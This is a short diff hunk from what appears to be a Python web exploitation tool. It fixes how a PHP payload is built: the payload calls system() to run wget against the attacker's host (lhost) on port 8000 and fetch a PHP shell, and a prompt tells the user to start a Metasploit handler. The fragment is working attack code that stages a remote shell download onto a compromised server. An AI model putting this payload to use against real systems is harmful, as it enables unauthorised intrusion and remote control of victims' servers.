@@ -150,7 +150,7 @@ class Input:
             payload = payload_file.read()
             payload_file.close()
         else:
-            payload = "<?php system('wget http://%s:8000/{0}.php'); ?>".format(shell)
+            payload = "<?php system('wget http://{0}:8000/{1}.php'); ?>".format(lhost,shell)
             
         if self.nostager:
             raw_input(t.green(" [!] ") + "Press enter to continue when your metasploit handler is running...") 
